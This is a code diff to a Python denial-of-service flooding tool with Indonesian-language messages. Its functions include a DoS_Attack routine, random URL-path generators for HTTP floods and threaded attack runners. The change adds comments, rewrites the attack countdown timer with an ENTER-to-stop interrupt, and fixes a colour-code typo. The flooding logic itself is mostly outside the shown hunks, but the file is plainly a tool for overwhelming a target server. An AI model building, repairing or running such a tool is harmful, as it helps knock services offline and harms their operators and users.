@@ -1,3 +1,4 @@
+# CHECK IMPORT
 try:
     import socket
     import threading
@@ -15,9 +16,11 @@ except ModuleNotFoundError as e:
 
 stop_attack = threading.Event()
 
+# Clear screen
 def clear_text():
     os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')
 
+# Generate random URL path
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     return "".join(random.sample(msg, int(num)))
@@ -26,6 +29,7 @@ def generate_url_path_choice(num):
     letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     return ''.join(random.choice(letter) for _ in range(int(num)))
 
+# Attack logic
 def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
     if stop_attack.is_set():
         return
@@ -58,33 +62,28 @@ def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loade
             th.start()
             th.join()
 
+# Countdown + interrupt
 def countdown_timer(time_loader):
-    last_printed = None
-    while True:
-        if stop_attack.is_set():
-            if last_printed is not None:
-                print(f"\n{Fore.YELLOW}Time remaining: {last_printed} seconds{Fore.RESET}")
-            print(f"{Fore.RED}Serangan Dihentikan{Fore.RESET}")
-            return
+    remaining = int(time_loader - time.time())
+    while remaining > 0 and not stop_attack.is_set():
+        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
+        sys.stdout.flush()
 
-        remaining = int(time_loader - time.time())
-        if remaining <= 0:
-            break
-
-        if remaining != last_printed:
-            sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
-            sys.stdout.flush()
-            last_printed = remaining
-
+        # Cek jika ENTER ditekan
         if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
             _ = sys.stdin.readline()
             stop_attack.set()
-            continue
+            print(f"\n{Fore.RED}Serangan Dihentikan{Fore.RESET}")
+            return
+
+        time.sleep(1)
+        remaining = int(time_loader - time.time())
 
     if not stop_attack.is_set():
         print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
         stop_attack.set()
 
+# Exit confirm
 def confirm_exit():
     while True:
         choice = input(f"{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}").lower()
@@ -95,6 +94,7 @@ def confirm_exit():
             print()
             return
 
+# MAIN COMMAND LOOP
 def command():
     global stop_attack
     while True:
@@ -153,6 +153,6 @@ if __name__ == "__main__":
     try:
         command()
     except KeyboardInterrupt:
-        print(f"\n{Fore.RED}Program terminated by user. Exiting...{ForeRESET}")
+        print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
         stop_attack.set()
         sys.exit(0)
